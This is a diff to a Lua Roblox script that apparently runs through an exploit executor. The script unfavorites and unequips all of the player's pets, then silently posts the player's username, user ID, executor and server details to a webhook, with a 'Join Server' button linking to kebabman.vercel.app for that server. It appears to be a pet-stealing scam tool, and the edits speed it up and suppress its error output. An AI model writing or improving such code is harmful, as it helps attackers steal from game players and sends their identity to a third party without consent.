@@ -92,7 +92,7 @@ local function unfavoriteAllPetsInBackpack()
             end)
             if success and isPet then
                 favoriteRemote:FireServer(item)
-                task.wait(1)
+                task.wait(0.4)
             end
         end
     end
@@ -142,6 +142,11 @@ local function sendWebhookNotification(foundPetsData)
     local currentPlayers = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers
     
+    local serverType = "Public"
+    if currentPlayers == 1 then
+        serverType = "Private"
+    end
+    
     local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     
     local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",
@@ -187,20 +192,33 @@ local function sendWebhookNotification(foundPetsData)
                     {
                         name = "📊 Server Info",
                         value = serverInfoValue,
-                        inline = false
+                        inline = true
                     },
                     {
-                        name = "🔗 Server Link",
-                        value = joinLink,
-                        inline = false
+                        name = "🔒 Server Type",
+                        value = string.format("`%s`", serverType),
+                        inline = true
                     }
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }
+        },
+        components = {
+            {
+                type = 1, -- Action Row
+                components = {
+                    {
+                        type = 2, -- Button
+                        style = 5, -- Link Style
+                        label = "Join Server",
+                        url = joinLink
+                    }
+                }
+            }
         }
     }
 
-    local success, err = pcall(function()
+    pcall(function()
         request({
             Url = webhookUrl,
             Method = "POST",
@@ -208,10 +226,6 @@ local function sendWebhookNotification(foundPetsData)
             Body = HttpService:JSONEncode(payload)
         })
     end)
-    
-    if not success then
-        -- Silently fail or handle error without printing
-    end
 end
 
 local function hopToServer(sortBy)
@@ -296,7 +310,7 @@ if not hoppedFromPrivate then
 end
 
 unequipAllPets()
-task.wait(0.3)
+task.wait(0.2)
 unfavoriteAllPetsInBackpack()
 
 task.wait(0)
